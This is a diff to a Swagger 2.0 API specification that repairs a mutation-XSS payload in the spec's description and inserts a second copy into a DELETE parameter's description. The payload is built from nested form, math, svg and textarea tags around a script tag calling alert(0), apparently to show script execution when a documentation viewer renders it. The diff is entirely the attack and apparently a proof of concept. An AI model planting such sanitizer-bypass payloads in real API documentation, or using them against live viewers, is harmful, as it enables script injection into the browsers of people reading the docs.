@@ -3,7 +3,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea></script><script>alert(0)<;/script><!--"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea></script><script>alert(0);</script><!--"></form>
 
   version: production
 basePath: https://google.com
@@ -29,7 +29,8 @@ paths:
     delete:
       parameters:
       - description: |
-      TEST
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea></script><script>alert(0);</script><!--"></form>
+
         format: int64
         in: path
         name: id
